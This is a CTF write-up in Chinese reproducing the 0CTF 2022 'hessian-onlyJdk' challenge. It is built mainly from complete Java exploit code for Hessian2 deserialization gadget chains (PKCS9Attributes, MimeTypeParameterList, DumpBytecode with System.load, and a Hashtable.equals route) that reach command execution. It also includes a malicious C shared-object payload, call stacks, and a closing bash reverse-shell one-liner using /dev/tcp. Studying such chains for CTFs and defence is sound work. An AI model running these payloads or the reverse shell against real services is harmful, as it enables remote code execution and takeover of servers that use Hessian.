title: 0CTF/TCTF 2022 hessian-onlyJdk
author: bmth
categories:
  - CTF
tags:
  - TCTF
top_img: 'https://img-blog.csdnimg.cn/f50add56ef55431a8900fc4290625c26.png'
cover: 'https://img-blog.csdnimg.cn/f50add56ef55431a8900fc4290625c26.png'
date: 2023-02-07 14:13:00
---
![](https://img-blog.csdnimg.cn/f50add56ef55431a8900fc4290625c26.png)

好久没有学习新的ctf知识点了，复现一下近期出现的一个hessian-onlyJdk
题目源码下载：[https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk](https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk)

看到环境只有hessian 4.0.38和openjdk 8u342，源码就是一个hessian2反序列化，相当于打jdk原生链
![](https://img-blog.csdnimg.cn/ad0d12ae6ff84bb7a119faf02b3d6200.png)

## 预期
我们先来学习一下触发到toString()的利用，[Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297）](https://paper.seebug.org/1814/)
### CVE-2021-43297 
漏洞在`com.caucho.hessian.io.Hessian2Input#expect()`这里
![](https://img-blog.csdnimg.cn/0ac14829537543129a86522281c9220a.png)

可以看到有个`readObject()`的操作，接着就是一个String和对象的拼接，很明显会调用`toString()`
并且发现在`com.caucho.hessian.io.Hessian2Input#readString()`中就有`expect()`的调用
![](https://img-blog.csdnimg.cn/2f358ea313794262bcc1b1f30d8e2e24.png)

需要default条件才会调用，我们只需要取default上面没有条件的case就行了

这里取case 67的时候调用 readObjectDefinition 方法进入readString
直接baos写进去就可以了：
```java
ByteArrayOutputStream baos = new ByteArrayOutputStream();
Hessian2Output output = new Hessian2Output(baos);
baos.write(67);
output.writeObject(evilClass);
output.flushBuffer();

ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
Hessian2Input input = new Hessian2Input(bais);
input.readObject();
```

调用栈如下：
```
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```
实际上触发点不止这一个：
1. case 77 调用 readtype ，进入 readInt 触发expect
2. case 79 调用 readInt 触发expect
3. case 81 调用 readInt 触发expect


题目给出的 hint 中，有一个toString利用链：[https://x-stream.github.io/CVE-2021-21346.html](https://x-stream.github.io/CVE-2021-21346.html)
```
javax.swing.MultiUIDefaults#toString
	UIDefaults#get
		UIDefaults#getFromHashTable
			UIDefaults$LazyValue#createValue
			SwingLazyValue#createValue
				javax.naming.InitialContext#doLookup()
```
`sun.swing.SwingLazyValue#createValue`可以调用任意静态方法或者一个构造函数
![](https://img-blog.csdnimg.cn/20192ce23e59455989bd47c04cdc6654.png)

但是发现没法使用：
- `javax.swing.MultiUIDefaults`是package-private类，只能在`javax.swing.`中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限
- 所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功


需要找个类替代`MultiUIDefaults`，由于`UIDefaults`是继承Hashtable的 ，所以需要从toString()到HashTable.get()

注意：**Hessian可以反序列化未实现 Serializable 接口的类**

### PKCS9Attributes+SwingLazyValue+JavaWrapper._mian
找到`sun.security.pkcs.PKCS9Attributes`
![](https://img-blog.csdnimg.cn/20e12bd10dd34c7395031dccc9d7b8a6.png)

跟进getAttribute
![](https://img-blog.csdnimg.cn/f3dab55ce6be4e078bd5ca295f8c7f80.png)

这个`this.attributes`刚好是个HashTable

接下来就是找一个类，调用其静态public方法，找到：`com.sun.org.apache.bcel.internal.util.JavaWrapper`的`_mian`方法
![](https://img-blog.csdnimg.cn/cda54bd08c74415e93e6edb88c910845.png)

看到实例化一个JavaWrapper，进入wrapper.runMain
![](https://img-blog.csdnimg.cn/14bb2f607b3f4254970b4cee1977def1.png)

使用反射调用了类的`_main`方法，只需要给类里面加一个`_main`方法即可实现命令执行

看到loader.loadClass
![](https://img-blog.csdnimg.cn/fca1f46e817e44fcba5df510bd542ede.png)

发现是一个bcel classloader，写一个恶意类：
```java
public class test {
    public static void _main(String[] argv) throws Exception {
        Runtime.getRuntime().exec("calc");
    }
}
```
payload：
```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper {
    public static void main(String[] args) throws Exception {
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);

        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));

        setFieldValue(s,"attributes",uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(s);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```
调用栈：
```
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

参考：[0CTF2022-hessian-onlyjdk-WriteUp](https://siebene.github.io/2022/09/19/0CTF2022-hessian-onlyjdk-WriteUp/)

### MimeTypeParameterList+SwingLazyValue+MethodUtil.invoke
大佬们又找到了另外一条链，`javax.activation.MimeTypeParameterList`
![](https://img-blog.csdnimg.cn/319239c53d8c42a7ad7ea9c467f8941e.png)

可以看到MimeTypeParameterList对`this.parameters`调用了一个get，并且parameters是一个Hashtable

接下来就是找一个public static方法，找到了`sun.reflect.misc.MethodUtil`的invoke方法
![](https://img-blog.csdnimg.cn/65d67f08eb264e2aabf113949f8c0780.png)

这里对`MethodUtil.invoke`进行了两次调用，第一次满足进入invoke条件，第二次就是执行命令了
![](https://img-blog.csdnimg.cn/84184662f0be470990a41c620bdb96ad.png)

最后的payload：
```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Hessian_MimeTypeParameterList_SwingLazyValue_MethodUtil {
    public static void main(final String[] args) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);

        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});

        uiDefaults.put("key", slz);
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();

        setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        baos.write(67);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(mimeTypeParameterList);
        output.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```


调用栈：
```
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:253, MimeTypeParameterList (javax.activation)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```
参考：
[0CTF2022复现](https://blog.z3ratu1.cn/0CTF2022%E5%A4%8D%E7%8E%B0.html)
[与 CVE-2021-43297 相关的两道题目](https://harmless.blue/posts/bafdbae3-29de-4788-800d-ed9d5d8d0d79)

### MimeTypeParameterList+ProxyLazyValue+DumpBytecode.dumpBytecode+System.load
这里m0onsec师傅找到一个写文件的链：`jdk.nashorn.internal.codegen.DumpBytecode#dumpBytecode`
![](https://img-blog.csdnimg.cn/1939ee0e5df64ef78a178b22e88e949f.png)

可以看到参数都是可控的，写后缀为.class文件，并且目录不存在的话会创建目录

但是因为ClassLoader的原因 ，在SwingLazyValue这里只能加载 rt.jar 里面的类，而DumpBytecode类在 nashorn.jar 里面
最后找到`ProxyLazyValue.createValue`
![](https://img-blog.csdnimg.cn/aeb23948b0b945c38a15eb97a0d9635b.png)

这里获取到classLoader ，所以就能正常加载nashorn.jar了，但由于 Hessian 序列化的机制，ProxyLazyValue里面的 field acc 在反序列化过程中会报错 ， 所以需要将 acc 反射设置为null

我们可以写一个文件名为.class的so文件，然后使用System.load加载，因为System.load不管后缀是什么都可以执行
首先创建一个动态链接库
```c
#include <stdlib.h>
#include <stdio.h>

void __attribute__ ((__constructor__))  calc (){

    system("calc");
}
```
然后执行`gcc -c calc.c -o calc && gcc calc --share -o calc.so` 生成恶意so文件

写文件payload：
```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import jdk.nashorn.internal.runtime.ScriptEnvironment;
import jdk.nashorn.internal.runtime.logging.DebugLogger;
import sun.misc.Unsafe;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Hessian_MimeTypeParameterList_ProxyLazyValue_DumpBytecode {
    public static void main(String[] args) throws Exception {
        Unsafe unsafe = getUnsafe();
        Object script = unsafe.allocateInstance(ScriptEnvironment.class);
        setFieldValue(script,"_dest_dir","/tmp/");
        Object debug=unsafe.allocateInstance(DebugLogger.class);
        byte[] code= Files.readAllBytes(Paths.get("./calc.so"));
        String classname="calc";

        //写文件
        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode", new Object[]{
                script,
                debug,
                code,
                classname
        });

        //System.load加载so文件
//        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{
//                "/tmp/calc.class"
//        });

        setFieldValue(proxyLazyValue,"acc",null);
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("key", proxyLazyValue);

        Class clazz = Class.forName("java.awt.datatransfer.MimeTypeParameterList");
        Object mimeTypeParameterList = unsafe.allocateInstance(clazz);
        setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(mimeTypeParameterList);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Unsafe getUnsafe() throws Exception{
        Class<?> aClass = Class.forName("sun.misc.Unsafe");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();
        return unsafe;
    }
}
```
最后加载即可，**注意linux和windows生成的so文件存在区别**

调用栈：
```
dumpBytecode:107, DumpBytecode (jdk.nashorn.internal.codegen)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:71, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:275, MethodUtil (sun.reflect.misc)
run:1108, UIDefaults$ProxyLazyValue$1 (javax.swing)
doPrivileged:-1, AccessController (java.security)
createValue:1087, UIDefaults$ProxyLazyValue (javax.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:290, MimeTypeParameterList (java.awt.datatransfer)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

参考：[0ctf2022 hessian-only-jdk writeup jdk原生链](https://xz.aliyun.com/t/11732)

## 非预期
0ops师傅的解法是直接走的Hashtable.equals这个入口，不从tostring()走
![](https://img-blog.csdnimg.cn/192d05b8f90c4c44ada93c9b1b888f7e.png)

payload：
```java
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import com.caucho.hessian.io.*;
import java.io.*;
import java.util.HashMap;
import javax.swing.UIDefaults;
import sun.swing.SwingLazyValue;

public class Hessian_onlyJdk {
    public static void main(final String[] args) throws Exception {
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});

        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("_", slz);
        UIDefaults uiDefaults2 = new UIDefaults();
        uiDefaults2.put("_", slz);

        HashMap hashMap = makeMap(uiDefaults1,uiDefaults2);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output oo = new Hessian2Output(bos);
        oo.getSerializerFactory().setAllowNonSerializable(true);
        oo.writeObject(hashMap);
        oo.flush();

        ByteArrayInputStream bai = new ByteArrayInputStream(bos.toByteArray());
        Hessian2Input hessian2Input = new Hessian2Input(bai);
        hessian2Input.readObject();
    }
    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```
调用栈：
```
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
equals:814, Hashtable (java.util)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:538, SerializerFactory (com.caucho.hessian.io)
readObject:2110, Hessian2Input (com.caucho.hessian.io)
```
最后使用`bash -c $@|bash 0 echo bash -i >& /dev/tcp/ip/port 0>&1`反弹shell即可
